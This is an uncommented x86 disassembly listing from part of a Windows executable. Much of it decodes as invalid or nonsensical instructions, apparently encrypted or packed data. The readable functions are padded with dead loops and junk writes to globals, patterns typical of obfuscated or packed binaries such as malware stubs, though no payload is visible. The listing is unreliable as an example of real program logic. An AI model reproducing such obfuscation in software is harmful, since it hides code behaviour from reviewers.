  4058f9:	and    DWORD PTR [ebx+0x2956423f],ecx
  4058ff:	jle    0x405920
  405901:	push   ebx
  405902:	loop   0x4058ce
  405904:	pop    ebx
  405905:	push   es
  405906:	lea    ecx,[esi-0x2a]
  405909:	fidivr WORD PTR ds:0x69805fc4
  40590f:	pop    esp
  405910:	fcomp  DWORD PTR [edx-0x6]
  405913:	fsubr  DWORD PTR [eax+0x7ea9599a]
  405919:	sub    BYTE PTR [ebp+eiz*1-0x22],ah
  40591d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591e:	(bad)  
  40591f:	test   al,0xe5
  405921:	sub    BYTE PTR [edi+0x6c],0x86
  405925:	lahf   
  405926:	(bad)  
  405927:	sti    
  405928:	jge    0x4058e9
  40592a:	inc    edi
  40592b:	pusha  
  40592c:	mov    dh,0x54
  40592e:	(bad)  
  40592f:	adc    BYTE PTR [ebx],bh
  405931:	and    al,al
  405933:	push   ebx
  405934:	xchg   edx,eax
  405935:	out    0xc2,eax
  405937:	inc    esp
  405938:	pusha  
  405939:	sub    BYTE PTR [ecx+0x0],cl
  40593c:	xchg   edx,eax
  40593d:	mov    dh,0x95
  40593f:	ins    BYTE PTR es:[edi],dx
  405940:	js     0x405953
  405942:	jo     0x4058e9
  405944:	stc    
  405945:	or     al,0x90
  405947:	mov    al,ds:0x7fca667a
  40594c:	cld    
  40594d:	sar    DWORD PTR [ebp+edx*8-0x5653e533],1
  405954:	shl    BYTE PTR [ebx+ecx*4],1
  405957:	inc    ebp
  405958:	or     BYTE PTR [ebx],dh
  40595a:	rol    DWORD PTR [ebx],0xc2
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x9b56a211
  40597e:	pop    eax
  40597f:	(bad)  
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	xchg   edx,eax
  405988:	mov    edi,0xc71447dd
  40598d:	add    al,0x2c
  40598f:	jp     0x405955
  405991:	xchg   ebp,eax
  405992:	into   
  405993:	xchg   BYTE PTR [esi+0x94fb848],cl
  405999:	jmp    0x405984
  40599b:	and    BYTE PTR [edi+0x2b],al
  40599e:	xchg   ebx,eax
  40599f:	fstp   st(7)
  4059a1:	(bad)  
  4059a2:	jae    0x40597d
  4059a4:	mov    dh,0x89
  4059a6:	dec    edx
  4059a7:	fiadd  WORD PTR [eax+0x25307636]
  4059ad:	push   ds
  4059ae:	pcmpeqd mm1,QWORD PTR [esi]
  4059b1:	push   0x667ac5da
  4059b6:	loop   0x40594d
  4059b8:	(bad)  
  4059ba:	mov    cs,WORD PTR [ecx+0x3]
  4059bd:	jnp    0x405a16
  4059bf:	xchg   esp,eax
  4059c0:	inc    esi
  4059c1:	mov    al,ds:0xb1c8634c
  4059c6:	jmp    0x6859:0x2074cfc
  4059cd:	imul   esi,DWORD PTR ds:0xb1ec66ed,0xffffffcb
  4059d4:	in     eax,dx
  4059d5:	and    DWORD PTR [ebx+0x481e31ce],esi
  4059db:	fld    TBYTE PTR [edi+0x727d3c6c]
  4059e1:	mov    ch,0xf6
  4059e3:	jmp    0x35adba1c
  4059e8:	or     DWORD PTR [esi-0x3],eax
  4059eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ec:	in     eax,0x94
  4059ee:	je     0x4059d8
  4059f0:	outs   dx,DWORD PTR ds:[esi]
  4059f1:	call   0xc89458c
  4059f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f7:	fldl2e 
  4059f9:	and    BYTE PTR [esi],bh
  4059fb:	mov    ah,0x7a
  4059fd:	and    BYTE PTR [edx+0x13],dl
  405a00:	dec    edi
  405a01:	in     eax,dx
  405a02:	sbb    DWORD PTR [edx],esi
  405a04:	mov    esp,0x42f3608c
  405a09:	xchg   ebx,eax
  405a0a:	arpl   WORD PTR [ecx+0x3d],di
  405a0d:	mov    ebp,0xef03fcf5
  405a12:	mov    cl,0xe7
  405a14:	(bad)  
  405a15:	fimul  WORD PTR [edi-0x56cddfe2]
  405a1b:	stc    
  405a1c:	pop    es
  405a1d:	jl     0x4059f5
  405a1f:	cmp    BYTE PTR [edx],ch
  405a21:	jp     0x4059a8
  405a23:	fldcw  WORD PTR [eax-0xe]
  405a26:	shr    bl,1
  405a28:	jo     0x405a18
  405a2a:	xchg   eax,ebp
  405a2c:	inc    ebx
  405a2d:	adc    DWORD PTR [esi+0x79ee35cf],0x65306e7c
  405a37:	inc    esi
  405a38:	sar    BYTE PTR [edx+ebp*2],cl
  405a3b:	or     cl,cl
  405a3d:	test   BYTE PTR [edx],bh
  405a3f:	and    al,0x87
  405a41:	mov    gs,WORD PTR [esp+eax*4+0x77]
  405a45:	(bad)  
  405a46:	aam    0x28
  405a48:	jne    0x405aa6
  405a4a:	clc    
  405a4b:	shl    DWORD PTR [ebp-0x33],cl
  405a4e:	in     eax,0x6f
  405a50:	test   ebp,edx
  405a52:	dec    edx
  405a53:	mov    WORD PTR [ecx],cs
  405a55:	mov    DWORD PTR ds:0x335e4fd9,ecx
  405a5b:	mov    ebp,0xc0585029
  405a60:	in     eax,dx
  405a61:	pop    es
  405a62:	xchg   DWORD PTR [ecx+0x48],esp
  405a65:	std    
  405a66:	icebp  
  405a67:	jl     0x405a84
  405a69:	mov    DWORD PTR [edi+edi*8-0x2c],ebx
  405a6d:	fcomp  DWORD PTR [ebp-0x76]
  405a70:	jl     0x405adc
  405a72:	bound  edx,QWORD PTR [eax-0x6e15c815]
  405a78:	rcr    BYTE PTR [esi+0x4e3c9ff1],0xe2
  405a7f:	jmp    FWORD PTR [ebp-0xfb7aff0]
  405a85:	outs   dx,DWORD PTR ds:[esi]
  405a86:	sbb    DWORD PTR [ebx+0x4c4c565b],ecx
  405a8c:	out    dx,eax
  405a8d:	outs   dx,BYTE PTR ds:[esi]
  405a8e:	push   0x9975c051
  405a93:	jp     0x405b0a
  405a95:	cmc    
  405a96:	and    DWORD PTR [esp+ebp*4+0x70],edi
  405a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a9b:	std    
  405a9c:	in     eax,dx
  405a9d:	fst    DWORD PTR fs:[eax+0x47251198]
  405aa4:	xor    bh,dh
  405aa6:	and    esi,eax
  405aa8:	push   0x6b
  405aaa:	addr16 cld 
  405aac:	add    DWORD PTR [ebp+0x2d2c8aec],ebp
  405ab2:	push   ds
  405ab3:	(bad)  [eax+0x3843eefc]
  405ab9:	and    al,BYTE PTR [esp+eiz*8]
  405abc:	mov    esp,0x39762a69
  405ac1:	sub    eax,ebp
  405ac3:	push   esp
  405ac4:	push   0xe9c14c02
  405ac9:	mov    esi,0x17718300
  405ace:	test   DWORD PTR ds:0xb9f256f7,ecx
  405ad4:	test   eax,0xf77264fc
  405ad9:	icebp  
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	loopne 0x405d3a
  405da6:	pop    ebx
  405da7:	adc    al,0x8b
  405da9:	xor    al,0x70
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405d43
  405db1:	in     al,dx
  405db2:	pushf  
  405db3:	bound  eax,QWORD PTR [edi]
  405db5:	lahf   
  405db6:	push   esp
  405db7:	dec    ebp
  405db8:	retf   
  405db9:	lds    edx,FWORD PTR [edx]
  405dbb:	push   cs
  405dbc:	inc    esi
  405dbd:	leave  
  405dbe:	ds loopne 0x405dc1
  405dc1:	jae    0x405d9f
  405dc3:	rcr    bh,1
  405dc5:	popf   
  405dc6:	jns    0x405e38
  405dc8:	push   esp
  405dc9:	jnp    0x405dd3
  405dcb:	cli    
  405dcc:	popa   
  405dcd:	push   ecx
  405dce:	or     WORD PTR [eax-0x15],si
  405dd2:	dec    eax
  405dd3:	mov    ebp,0xbfcfeb7a
  405dd8:	sub    dh,ch
  405dda:	pop    edi
  405ddb:	pop    es
  405ddc:	stc    
  405ddd:	push   ds
  405dde:	or     DWORD PTR [ecx-0xa2c7d1e],edi
  405de4:	(bad)  
  405de5:	mov    dl,0x35
  405de7:	int3   
  405de8:	movhps xmm3,QWORD PTR [edx+ebx*4+0x7e5f99a9]
  405df0:	pop    edi
  405df1:	sub    BYTE PTR [ecx+0x3a],al
  405df4:	retf   
  405df5:	out    dx,al
  405df6:	mov    ebx,0x3a8d3248
  405dfb:	cmp    BYTE PTR ds:0x4ff1da06,ch
  405e01:	push   edx
  405e02:	jno    0x405df5
  405e04:	push   eax
  405e05:	inc    ebp
  405e06:	push   ebx
  405e07:	add    DWORD PTR [edi-0x110995b2],edi
  405e0d:	out    0xb1,al
  405e0f:	(bad)  
  405e10:	rol    DWORD PTR [ebp+0x345598d3],cl
  405e16:	je     0x405e3f
  405e18:	mov    bh,0xee
  405e1a:	ss mov ch,0x4c
  405e1d:	adc    al,0x6e
  405e1f:	adc    BYTE PTR [ebp-0x350b8e9f],dl
  405e25:	pop    esp
  405e26:	mov    bl,0x3f
  405e28:	or     BYTE PTR [ebx+0x5af9b2f0],ah
  405e2e:	scas   eax,DWORD PTR es:[edi]
  405e2f:	fsub   DWORD PTR [eax+0x99c0a58]
  405e35:	(bad)  
  405e36:	push   esi
  405e37:	addr16 push ebp
  405e39:	mov    es,WORD PTR [ebp-0x34]
  405e3c:	jecxz  0x405ea6
  405e3e:	rol    DWORD PTR [edi-0x3780d986],1
  405e44:	call   0x189fce79
  405e49:	scas   al,BYTE PTR es:[edi]
  405e4a:	lock (bad) 
  405e4c:	iret   
  405e4d:	adc    DWORD PTR [ebx-0x1f],0xffffff93
  405e51:	pusha  
  405e52:	xor    BYTE PTR ds:0xa7721753,bl
  405e58:	sbb    bl,BYTE PTR [eax+0x56b227ab]
  405e5e:	push   es
  405e5f:	pop    edi
  405e60:	arpl   WORD PTR [esi],si
  405e62:	ins    DWORD PTR es:[edi],dx
  405e63:	push   ds
  405e64:	and    ch,al
  405e66:	mov    eax,ds:0x7e9f131b
  405e6b:	stos   BYTE PTR es:[edi],al
  405e6c:	inc    esp
  405e6d:	push   eax
  405e6e:	out    0xaa,eax
  405e70:	pop    edi
  405e71:	inc    eax
  405e72:	fisubr DWORD PTR [ebx+eiz*2-0x1d]
  405e76:	cmp    DWORD PTR [esi],edx
  405e78:	jecxz  0x405ec4
  405e7a:	and    al,BYTE PTR [esi+0x24]
  405e7d:	(bad)  
  405e7e:	fild   DWORD PTR [ebp-0x2d]
  405e81:	ins    DWORD PTR es:[edi],dx
  405e82:	adc    ebp,DWORD PTR [ebp+0x5f]
  405e85:	mov    ch,BYTE PTR [esi+edi*2-0x45]
  405e89:	xor    bl,cl
  405e8b:	jo     0x405ef3
  405e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e8e:	sbb    esp,DWORD PTR [esi+0x46bacd61]
  405e94:	adc    BYTE PTR [ebp+0x6d08c6bc],ch
  405e9a:	pop    ebx
  405e9b:	ja     0x405e43
  405e9d:	je     0x405e4a
  405e9f:	push   cs
  405ea0:	call   0xef95856c
  405ea5:	or     eax,0x18d6c2d2
  405eaa:	jb     0x405e64
  405eac:	rcr    ebp,1
  405eae:	jge    0x405ec3
  405eb0:	loope  0x405f1a
  405eb2:	sar    DWORD PTR [esi],cl
  405eb4:	ins    DWORD PTR es:[edi],dx
  405eb5:	loop   0x405e48
  405eb7:	(bad)  
  405eb9:	pop    ebp
  405eba:	jae    0x405ec3
  405ebc:	jb     0x405e74
  405ebe:	std    
  405ebf:	sbb    ebx,DWORD PTR [eax]
  405ec1:	in     al,dx
  405ec2:	dec    DWORD PTR [esi+0x50]
  405ec5:	ret    
  405ec6:	int3   
  405ec7:	and    DWORD PTR [ecx+0x1333d029],esp
  405ecd:	add    ebx,edi
  405ecf:	mov    esi,0x76739c60
  405ed4:	xor    eax,0x921b6008
  405ed9:	xor    al,0x2
  405edb:	leave  
  405edc:	push   eax
  405edd:	es pushf 
  405edf:	push   eax
  405ee0:	stc    
  405ee1:	or     cl,BYTE PTR [edi-0x2f73be8f]
  405ee7:	lods   al,BYTE PTR ds:[esi]
  405ee8:	aad    0x39
  405eea:	dec    esp
  405eeb:	jmp    0x405ea2
  405eed:	sub    dh,BYTE PTR [edi+0x58bf843d]
  405ef3:	jg     0x405f34
  405ef5:	rol    BYTE PTR [edx],0xd8
  405ef8:	fadd   QWORD PTR [esi+0x30d8714c]
  405efe:	xor    DWORD PTR [ebx],edi
  405f00:	mov    ds:0x983d5c7f,al
  405f05:	push   ss
  405f06:	popf   
  405f07:	sub    ebx,DWORD PTR [bx+di-0x1]
  405f0b:	arpl   bx,si
  405f0d:	xchg   edi,eax
  405f0e:	rcr    DWORD PTR [edi+0x47],0x75
  405f12:	mov    ?,edx
  405f14:	fisubr DWORD PTR [esi]
  405f16:	mov    ebx,0xc0e468fa
  405f1b:	retf   0xae22
  405f1e:	pop    ebx
  405f1f:	cli    
  405f20:	inc    esp
  405f21:	push   DWORD PTR [ebx]
  405f23:	mul    ebp
  405f25:	mov    ah,0x9a
  405f27:	mov    esp,0xd483e6be
  405f2c:	enter  0x675a,0xcf
  405f30:	jne    0x405f06
  405f32:	sbb    BYTE PTR [edi+0x5d],dl
  405f35:	arpl   dx,si
  405f37:	lods   eax,DWORD PTR ds:[esi]
  405f38:	data16 jl 0x405eef
  405f3b:	fisttp QWORD PTR [ebx]
  405f3d:	lods   eax,DWORD PTR ds:[esi]
  405f3e:	mov    ah,0x1f
  405f40:	pmaxsw mm6,mm5
  405f43:	in     eax,dx
  405f44:	mov    dh,0xac
  405f46:	mov    edi,0xe14a0e6e
  405f4b:	pushf  
  405f4c:	hlt    
  405f4d:	aad    0xa4
  405f4f:	stc    
  405f50:	jne    0x405f43
  405f52:	add    ch,ah
  405f54:	repnz mov al,ds:0x20ef34cf
  405f5a:	ja     0x405f30
  405f5c:	dec    ecx
  405f5d:	inc    edi
  405f5e:	cwde   
  405f5f:	sub    DWORD PTR [ecx+0x5e],eax
  405f62:	ret    0xbb7f
  405f65:	jbe    0x405fdf
  405f67:	je     0x405f59
  405f69:	jge    0x405fa3
  405f6b:	and    BYTE PTR [ebx-0x46],dl
  405f6e:	adc    esp,DWORD PTR [ebx]
  405f70:	dec    esi
  405f71:	fwait
  405f72:	xchg   esp,eax
  405f73:	popf   
  405f74:	mov    bh,bl
  405f76:	out    dx,al
  405f77:	test   DWORD PTR [edx-0x6f],eax
  405f7a:	inc    ebx
  405f7b:	mov    ds:0xc6331adc,eax
  405f80:	cdq    
  405f81:	jp     0x405f17
  405f83:	pop    ebx
  405f84:	and    eax,0xd1726d39
  405f89:	mov    ch,0xae
  405f8b:	cmp    bl,BYTE PTR [eax+edx*1+0x4a03d0a3]
  405f92:	ins    BYTE PTR es:[edi],dx
  405f93:	out    0x68,al
  405f95:	popa   
  405f96:	ss sub al,0x88
  405f99:	enter  0x7ba7,0x83
  405f9d:	dec    ebp
  405f9e:	dec    edx
  405f9f:	xchg   edi,eax
  405fa0:	(bad)  
  405fa1:	and    bh,cl
  405fa3:	mov    ecx,0x4f8f83ec
  405fa8:	and    DWORD PTR [ebp+0x23],0x39
  405fac:	fdivr  st(4),st
  405fae:	aas    
  405faf:	aam    0xb7
  405fb1:	imul   eax,DWORD PTR [edx+0x66],0x4d
  405fb5:	dec    esp
  405fb6:	inc    esp
  405fb7:	bound  edx,QWORD PTR [edx]
  405fb9:	pop    ebp
  405fba:	adc    DWORD PTR [ebx-0x14],edi
  405fbd:	sub    DWORD PTR [edi-0x5],eax
  405fc0:	sub    eax,0x27e962aa
  405fc5:	aam    0x63
  405fc7:	es in  eax,0x72
  405fca:	mov    eax,0xe114fdde
  405fcf:	xor    ebp,esi
  405fd1:	mov    ecx,0xcf8e62d2
  405fd6:	xchg   esi,eax
  405fd7:	mov    fs,WORD PTR [edi]
  405fd9:	fistp  WORD PTR [esi]
  405fdb:	mov    ebp,0xf46250d7
  405fe0:	cmp    BYTE PTR [ebp+0x7],0xec
  405fe4:	push   0x9136dca
  405fe9:	test   al,0xf5
  405feb:	mov    ah,0x33
  405fed:	daa    
  405fee:	out    dx,eax
  405fef:	stc    
  405ff0:	jns    0x405fe3
  405ff2:	popf   
  405ff3:	outs   dx,DWORD PTR ds:[esi]
  405ff4:	xlat   BYTE PTR ds:[ebx]
  405ff5:	mov    bl,0x5c
  405ff7:	mov    bl,0x14
  405ff9:	fwait
  405ffa:	sahf   
  405ffb:	scas   eax,DWORD PTR es:[edi]
  405ffc:	pop    ds
  405ffd:	pop    sp
  405fff:	push   ecx
  406000:	mov    al,0xa3
  406002:	clc    
  406003:	cld    
  406004:	icebp  
  406005:	hlt    
  406006:	dec    ebp
  406007:	call   0x5026b570
  40600c:	dec    edi
  40600d:	mov    ch,0x26
  40600f:	mov    al,ds:0x4f1195d5
  406014:	adc    esi,DWORD PTR [edi+0x11]
  406017:	outs   dx,BYTE PTR ds:[esi]
  406018:	mov    dh,0xed
  40601a:	mov    al,ds:0xf6f47ded
  40601f:	push   ebp
  406020:	push   ds
  406021:	enter  0x4ea2,0x8a
  406025:	jp     0x406033
  406027:	nop
  406028:	dec    ecx
  406029:	mov    esp,0xb3a3ffe1
  40602e:	out    dx,eax
  40602f:	pop    edx
  406030:	addr16 cmp eax,0x7fe287be
  406036:	ins    BYTE PTR es:[edi],dx
  406037:	or     esi,DWORD PTR [esi-0x25108c07]
  40603d:	sub    eax,0xd31a8794
  406042:	stc    
  406043:	xlat   BYTE PTR ds:[ebx]
  406044:	xor    al,0xa6
  406046:	jns    0x40606d
  406048:	sbb    ah,dh
  40604a:	pushf  
  40604b:	add    bl,bl
  40604d:	dec    esp
  40604e:	dec    edx
  40604f:	loop   0x40603e
  406051:	or     eax,0x233fb390
  406056:	mov    eax,DWORD PTR [eax]
  406058:	inc    ebp
  406059:	or     ch,ah
  40605b:	sub    eax,0xed6ba247
  406060:	outs   dx,DWORD PTR ds:[esi]
  406061:	jbe    0x405fef
  406063:	or     dh,BYTE PTR [ebp-0x49]
  406066:	mov    ebp,0xfe2fbeae
  40606b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40606d:	aam    0x24
  40606f:	imul   eax,DWORD PTR [ebx-0x70],0x1196b597
  406076:	(bad)  
  406077:	cmp    BYTE PTR [esi-0xa45cf6],bl
  40607d:	pop    esi
  40607e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40607f:	mov    al,0x24
  406081:	iret   
  406082:	ds mov eax,0x871bbf39
  406088:	int3   
  406089:	es ss in eax,dx
  40608c:	mov    ah,0x89
  40608e:	push   esi
  40608f:	or     DWORD PTR [edi+ecx*8-0x14cfe1f1],esp
  406096:	nop
  406097:	pop    ecx
  406098:	stos   BYTE PTR es:[edi],al
  406099:	sub    dl,bh
  40609b:	jno    0x4060bf
  40609d:	pusha  
  40609e:	cmp    al,0x5c
  4060a0:	sub    al,0xb
  4060a2:	dec    edx
  4060a3:	ins    BYTE PTR es:[edi],dx
  4060a4:	add    eax,0xadeeaa0b
  4060a9:	imul   esp,DWORD PTR [ecx],0xffffffe2
  4060ac:	(bad)
  4060b0:	push   cs
  4060b1:	nop
  4060b2:	leave  
  4060b3:	popa   
  4060b4:	repnz cmp cl,bh
  4060b7:	sub    dh,BYTE PTR [edi]
  4060b9:	mov    ecx,DWORD PTR [esi]
  4060bb:	je     0x4060be
  4060bd:	test   esi,edi
  4060bf:	sbb    al,0x96
  4060c1:	and    eax,0x4c6a5912
  4060c6:	add    eax,0x36dbf2c5
  4060cb:	into   
  4060cc:	test   DWORD PTR [edx-0x720be18],ecx
  4060d2:	imul   eax,DWORD PTR [ebx],0xffffff91
  4060d5:	scas   eax,DWORD PTR es:[edi]
  4060d6:	shl    edx,1
  4060d8:	dec    edi
  4060d9:	push   ds
  4060da:	jbe    0x40611b
  4060dc:	mov    bl,0xfd
  4060de:	jl     0x406119
  4060e0:	xor    eax,esi
  4060e2:	add    DWORD PTR ds:0x432dbe,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43441d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	test   DWORD PTR [edx+0x31bbd83e],0x7d207070
  406114:	jo     0x406186
  406116:	das    
  406117:	jb     0x406113
  406119:	inc    eax
  40611a:	jb     0x40617d
  40611c:	xchg   esi,eax
  40611d:	fistp  DWORD PTR [ecx]
  40611f:	fistp  WORD PTR [ebp-0x71]
  406122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406123:	rcl    BYTE PTR [ecx],0xeb
  406126:	mov    ah,0xe4
  406128:	inc    eax
  406129:	pop    ebp
  40612a:	mov    BYTE PTR [ebx+0x5],bl
  40612d:	mov    cl,BYTE PTR [ecx+esi*1-0x9]
  406131:	popf   
  406132:	sti    
  406133:	fnstcw WORD PTR [edx+esi*4+0x6a8bb0e3]
  40613a:	mov    ecx,0x87eb85b3
  40613f:	daa    
  406140:	sub    bh,BYTE PTR [ebx-0x13]
  406143:	inc    ecx
  406144:	mov    al,0x42
  406146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406147:	dec    eax
  406148:	mov    WORD PTR [ecx-0x7c],?
  40614b:	dec    esi
  40614c:	dec    edi
  40614d:	ins    BYTE PTR es:[edi],dx
  40614e:	cs lock pop ecx
  406151:	push   ebp
  406152:	inc    esp
  406153:	leave  
  406154:	mov    ebp,0x90b07b2a
  406159:	retf   
  40615a:	ds xor DWORD PTR ss:[edx],0x4470d3c1
  406162:	cmp    al,0xde
  406164:	push   es
  406165:	out    dx,al
  406166:	jmp    0x7e3b402c
  40616b:	ja     0x4061bf
  40616d:	and    al,0xe6
  40616f:	sar    BYTE PTR [ebx+0x76],cl
  406172:	mov    esi,0x53f89517
  406177:	ss (bad) 
  40617a:	cld    
  40617b:	fld    TBYTE PTR [ebp-0x6be03f55]
  406181:	xchg   ebx,eax
  406182:	retf   
  406183:	mov    edi,0x5e525613
  406188:	inc    ebp
  406189:	enter  0xe1c1,0xff
  40618d:	aad    0xdf
  40618f:	call   0x1988:0x8c28422b
  406196:	ins    DWORD PTR es:[edi],dx
  406197:	lods   al,BYTE PTR ds:[esi]
  406198:	addr16 dec ebp
  40619a:	mov    dl,0x49
  40619c:	repz loopne 0x4061b0
  40619f:	fimul  DWORD PTR [esi+0x31309eee]
  4061a5:	cmp    eax,0xa2326ea8
  4061aa:	mov    WORD PTR [esp+eax*4-0x6b],cs
  4061ae:	cmp    eax,DWORD PTR [edi-0x39f0da60]
  4061b4:	mov    ch,0xe7
  4061b6:	gs hlt 
  4061b8:	xor    edx,DWORD PTR [eax-0x32765316]
  4061be:	cmp    al,0x2c
  4061c0:	push   eax
  4061c1:	inc    ebp
  4061c2:	push   ecx
  4061c3:	or     DWORD PTR [edi-0x1df8838],ebp
  4061c9:	js     0x4061cf
  4061cb:	jmp    0x406193
